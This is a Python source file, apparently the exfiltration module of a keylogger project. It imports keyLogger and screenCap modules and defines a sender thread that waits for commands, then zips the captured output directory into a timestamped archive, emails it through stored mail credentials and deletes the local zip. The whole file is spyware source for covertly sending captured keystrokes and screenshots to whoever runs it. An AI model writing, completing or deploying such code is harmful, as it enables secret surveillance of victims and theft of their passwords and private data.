import keyLogger
import screenCap
import threading
import sendMail
import time
import datetime
import zip
import os
from queue import Queue

print_lock = threading.Lock()

class sender(threading.Thread):
	outpuDir = ""
	def __init__(self, inQueue, outQueue, args=(), kwargs=None):
		global outputDir
		threading.Thread.__init__(self, args=(), kwargs=None)
		self.addr = args[2]
		self.passwd = args[3]
		self.inQueue = inQueue
		self.outQueue = outQueue
		self.daemon = False
		self.receive_messages = args[0]
		outputDir = args[1]

	def getZipName():
		now = datetime.datetime.now()
		zipName = (str(now.month) + 
			"_" + str(now.day) + "_" + str(now.year) +
			"_" + str(now.hour) + "_" + str(now.minute) +
			"_" + str(now.second) + "_output.zip")
		return zipName
		
	def run(self):
		global outputDir
		val = ""
		while True:
			time.sleep(5)
			val = ""
			if not self.inQueue.empty():
				val = self.inQueue.get()
			if val is "quit": 
				print(threading.currentThread().getName() + " quitting")
				return True
			elif val is "sendZip":
				print(threading.currentThread().getName() + " zipping and sending")
				fileName = sender.getZipName()
				zip.run(outputDir, fileName)
				sendMail.sendData(fileName, self.addr, self.passwd)
				print(threading.currentThread().getName() + " zipped and sent")
				os.remove(fileName)
				self.outQueue.put("done")